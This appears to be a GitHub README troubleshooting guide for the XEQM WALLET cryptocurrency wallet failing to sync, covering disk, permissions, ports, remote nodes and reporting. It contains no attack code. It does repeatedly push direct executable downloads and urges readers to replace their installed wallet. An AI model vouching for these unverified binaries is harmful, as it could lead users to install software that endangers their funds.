![XEQM WALLET](assets/banner-article.png)

# XEQM WALLET not syncing

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

When XEQM WALLET connects but will not sync, the chain on your machine stopped advancing. The usual causes are a disk that is full, a daemon that cannot write to its data directory, a firewall closing the peer port, or a local node so far behind that it looks frozen. All four are diagnosable from the interface and the logs before anything is reinstalled.

## Distinguish stalled from slow

A first sync of roughly 48 GB takes between four and twelve hours on a modern SSD, so a wallet that has been syncing for an hour is not stalled  -  it is early. The test is whether the block count moves over a few minutes.

Watch the number rather than the label. If it climbs, leave it alone. If it has not moved since you last looked, the rest of this page applies.

## Check the disk before anything else

A full disk is the most common hard stop, and it produces a sync that connects, reads for a while and then stops without an obvious error. The chain alone needs tens of gigabytes, and the operating system plus the application need room to work.

Free space or move the wallet to a larger drive by reinstalling and restoring from the seed. Do not move the data directory by hand. [Disk space for the XEQM chain](https://github.com/XEQMFoundation/platform-setup/blob/main/how-much-disk-for-xeqm-blockchain.md) covers the sizing.

## Check the data directory is writable

A daemon that cannot write its database will fail quietly or restart in a loop. That happens after a permissions change, a move between user accounts, or an install run with different rights than the one that created the data.

The log names it. Look for errors about opening or writing the data directory, and compare the account running the wallet with the account that owns the folder.

A folder owned by an administrator account while the wallet runs as an ordinary user is the common version, and it usually appears after an install was run with elevated rights. Fix the ownership rather than the wallet, and do not delete the folder to force a fresh start: that discards the chain and the wallet file together.

## Check the ports and the network

Peer-to-peer traffic uses port 9230, RPC uses 9231 and quorumnet uses 9232. A network that blocks outbound connections to those ports leaves a node with no peers, which presents as a sync that never starts rather than one that stops.

Try the machine on a different network to separate the wallet from the connection. [XEQM daemon firewall ports](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-firewall-ports.md) covers which directions matter.

## Try a remote node to isolate it

Point the wallet at a remote node in the network settings. If the balance and history appear immediately, the application is healthy and the local chain is the problem  -  which is exactly the information you need before spending an evening on the daemon.

Many people stay on the remote node afterwards, particularly on a laptop where 48 GB of chain and hours of sync are a poor trade for a wallet that only needs to send and receive. [Switch to a remote node](https://github.com/XEQMFoundation/platform-setup/blob/main/switch-xeqm-wallet-to-remote-node.md) is the trade.

## A port already in use

On Linux, a restart can leave the previous daemon holding its RPC port, and the new one then fails to bind. The symptom is a wallet that worked before the restart and will not sync after it, with an error naming the port rather than the wallet.

The documented ports are 9231 for RPC and 9230 for peer traffic, and a lingering process is the usual reason one is busy. Quit the wallet fully, confirm no daemon is still running, and start it again. [XEQM RPC port already in use](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-rpc-port-already-in-use.md) is the dedicated page.

## When the local node is simply behind

A node that was offline for a week has a week of blocks to read. It will catch up, and the indicator will advance slowly at first while it validates. Nothing is wrong, and nothing needs restoring.

Give it time before deciding it is stuck, especially on hardware at the minimum specification. Two cores and 4 GB of RAM will sync, but not at the speed of a machine built for it. [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md) is the sizing reference.

## What actually determines sync speed

Three things: the disk, the processor and the number of blocks to read. An SSD matters more than a fast processor here, because the chain is a database and the wallet is writing to it continuously; a spinning disk will sync and will feel broken while it does.

The second factor is what else the machine is doing. A node competing with a game, a video call and a dozen browser tabs at 4 GB of RAM will swap and crawl, and the sync indicator will look stalled while the disk thrashes. Close what you do not need and let it finish.

The third is the starting point. A node two days behind has two days of blocks; a node two months behind has two months. Neither is broken, and neither gets faster because you restarted it. Watch the block count over ten minutes before deciding anything.

## The update that fixes this class of problem

Several sync and connection problems are resolved in current builds, including how the wallet validates what a remote node returns before it builds a transaction. If the copy on your machine is old or came from somewhere other than the release page, replacing it is the supported step rather than the last resort.

Write the seed down first, verify the checksum, then install over the existing folder. [How to update XEQM WALLET](https://github.com/XEQMFoundation/platform-setup/blob/main/update-xeqm-wallet-to-latest-release.md) puts the operations in order.

## What not to do

Do not delete the chain database hoping it will fix itself: it will re-download, which costs hours and proves nothing. Do not reinstall repeatedly, and do not restore the wallet  -  a sync problem is not a wallet problem, and a restore does not touch the chain.

Do not run a "wallet repair" utility from a search result either. The programs that offer to fix a wallet are a route to your seed. [How to spot XEQM phishing](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-spot-xeqm-phishing.md) covers the pattern.

## Reporting it usefully

Send the platform, whether the wallet is on a local or remote node, the last block the wallet reports, the free disk space, and the relevant lines from the log. That is enough for somebody to name the cause without guessing.

Never send the seed, the password or the wallet file. A support conversation about sync needs none of them. [XEQM WALLET stuck on connecting](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-stuck-on-connecting.md) covers the case where the indicator never advances at all.

## Frequently asked questions

### How long should a full sync take?

Four to twelve hours for the chain on a modern SSD, longer on minimum hardware. A first run is not stalled until the block count stops moving.

### Can I use the wallet while it syncs?

Yes for receiving, and for sending once it reaches the blocks holding your outputs. A remote node makes it usable immediately.

### Does syncing again download everything?

Only if the chain database is missing or discarded. A node that is behind resumes from where it stopped.

### Why does the wallet sync on one network and not another?

Because the restriction is usually the connection, not the wallet. Ports 9230 to 9232 blocked at the network level produce exactly that, and moving the machine proves it in minutes.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [XEQM WALLET stuck on connecting](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-stuck-on-connecting.md)
- [Switch to a remote node](https://github.com/XEQMFoundation/platform-setup/blob/main/switch-xeqm-wallet-to-remote-node.md)
- [XEQM daemon fails to start on Linux](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-fails-to-start-linux.md)
